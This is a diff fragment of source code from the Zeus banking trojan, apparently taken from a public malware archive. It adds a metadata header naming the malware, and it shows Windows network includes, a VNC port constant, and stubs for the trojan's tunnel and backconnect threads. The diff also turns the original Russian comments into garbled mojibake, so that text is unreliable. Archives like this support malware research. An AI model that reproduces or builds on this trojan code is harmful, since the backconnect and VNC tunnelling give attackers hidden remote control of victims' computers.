@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wininet.h>
 #include <ws2tcpip.h>
@@ -21,13 +32,13 @@
 #if(BO_BCSERVER_PLATFORMS > 0)
 
 /*
-  Проверяет, ялвется список серверов валидным.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN list     - список.
-  IN listSize - размер списка.
+  IN list     - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN listSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return      - true - список валидный,
-                false - список не валидный.
+  Return      - true - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                false - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool isValidList(const LPSTR list, DWORD listSize)
 {
@@ -55,7 +66,7 @@ typedef struct
 #define SERVICE_PORT_VNC   ((DWORD)-2) //VNC.
 
 /*
-  Поток для для создания тунеля.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN p   - BCTUNNELDATA.
 
@@ -134,7 +145,7 @@ static DWORD WINAPI procTunnel(void *p)
 }
 
 /*
-  Поток для для создания бэконекта.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN p   - BCDATA.
 
